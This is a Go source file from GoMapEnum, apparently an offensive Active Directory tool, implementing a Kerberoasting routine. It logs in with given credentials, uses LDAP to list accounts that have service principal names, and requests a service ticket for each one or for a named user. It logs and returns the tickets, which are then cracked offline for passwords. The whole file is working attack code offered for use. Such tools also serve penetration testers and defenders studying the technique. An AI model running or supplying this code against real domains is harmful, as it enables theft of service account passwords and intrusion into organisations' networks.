package kerberos

import (
	"GoMapEnum/src/logger"
	"GoMapEnum/src/modules/ldap"
	"reflect"
	"strings"
)

func (options *Options) Kerberoasting(username string) string {

	optionsInterface := reflect.ValueOf(options).Interface()
	if !KerberosSession(&optionsInterface) {
		options.Log.Fatal("Cannot initialize Kerberos session")
	}
	client, err := options.authenticate(options.Users, options.Passwords)
	if err != nil {
		ok, errorString := handleKerbError(err)
		if ok {
			options.Log.Error("%s - %s", username, errorString)
		} else {
			options.Log.Fatal("%s - %s", username, errorString)
		}
		return ""
	}
	var optionsLDAP ldap.Options
	tmpLog := new(logger.Logger)
	*tmpLog = *options.Log
	optionsLDAP.Log = tmpLog
	optionsLDAP.Log.Level = logger.ErrorLevel
	optionsLDAP.Log.Module = "LDAP\t"
	optionsLDAP.TLS = "StartTLS"
	optionsLDAP.Users = options.Users
	optionsLDAP.Passwords = options.Passwords
	optionsLDAP.Target = options.Target
	optionsLDAP.ProxyHTTP = options.ProxyHTTP
	optionsLDAP.UseNTLM = true

	if !optionsLDAP.InitLDAP() {
		options.Log.Error("Cannot initialize LDAP")
		return ""
	}
	if username != "" {
		var spn string
		kerberoastableAccounts := ldap.ParseLDAPData(optionsLDAP.DumpObject("kerberoastableaccounts"), []string{"sAMAccountName", "servicePrincipalName"})
		for _, account := range kerberoastableAccounts {
			if strings.EqualFold(account[0], username) {
				spn = account[1]
			}
		}
		if spn == "" {
			options.Log.Error("cannot find an SPN for %s", username)
			return ""
		}
		options.Log.Debug("Getting the TGS of %s with spn %s", username, spn)
		TGS := kerberoasting(client, username, spn)
		options.Log.Success(TGS)
		return TGS
	}
	kerberoastableAccounts := ldap.ParseLDAPData(optionsLDAP.DumpObject("kerberoastableaccounts"), []string{"sAMAccountName", "servicePrincipalName"})
	var res []string
	for _, account := range kerberoastableAccounts {
		res = append(res, options.Kerberoasting(account[0]))
	}

	return strings.Join(res, "\n")
}
